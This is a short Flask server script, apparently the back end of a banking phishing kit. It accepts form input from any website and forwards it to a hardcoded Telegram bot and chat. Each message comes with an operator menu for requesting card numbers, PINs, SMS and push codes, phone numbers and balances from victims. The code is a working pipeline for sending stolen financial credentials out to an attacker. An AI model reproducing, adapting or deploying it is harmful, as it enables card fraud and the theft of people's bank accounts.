from flask import Flask, request, jsonify, redirect
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

TELEGRAM_BOT_TOKEN = "7368319072:AAGRGJU9NqchsjSMGHdVSrKGZEXYfyyRiUE"
CHAT_ID = "294154587"

# 📌 Функция создания клавиатуры (меню)
def get_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "SMS", "url": "https://www.cikava-kava.com.ua/remont-kavomashyn-dnipro/"}],  # Автоматический редирект

            [{"text": "Пуш", "callback_data": "push"},
             {"text": "Ввод карты", "callback_data": "card"},
             {"text": "PIN", "callback_data": "pin"}],

            [{"text": "Лимиты", "callback_data": "limits"},
             {"text": "Неверный код", "callback_data": "wrong_code"},
             {"text": "Номер телефона", "callback_data": "phone"}],

            [{"text": "Свой текст/фото", "callback_data": "custom_text"}],

            [{"text": "Пополнение", "callback_data": "topup"},
             {"text": "Баланс", "callback_data": "balance"}],

            [{"text": "✅ Успех", "callback_data": "success"},
             {"text": "❌ Неверный ЛК", "callback_data": "wrong_lk"}]
        ]
    }

@app.route('/')
def home():
    return "🚀 Сервер работает! Используйте /send для отправки сообщений."

@app.route('/send', methods=['POST'])
def send_to_telegram():
    """Принимает данные и отправляет их в Telegram с меню"""
    data = request.json
    user_input = data.get("user_input", "")

    if not user_input:
        return jsonify({"error": "Введите данные!"}), 400

    # 📌 Отправляем сообщение в Telegram с меню
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"📩 Новый запрос: {user_input}",
        "reply_markup": get_menu_keyboard()  # <-- Добавляем кнопки с редиректом
    }

    response = requests.post(telegram_url, json=payload)

    if response.status_code == 200:
        return jsonify({"message": "✅ Данные успешно отправлены с меню!"})
    else:
        return jsonify({"error": "❌ Ошибка отправки!"}), 500

if __name__ == "__main__":
    from waitress import serve
    serve(app, host="0.0.0.0", port=10000)

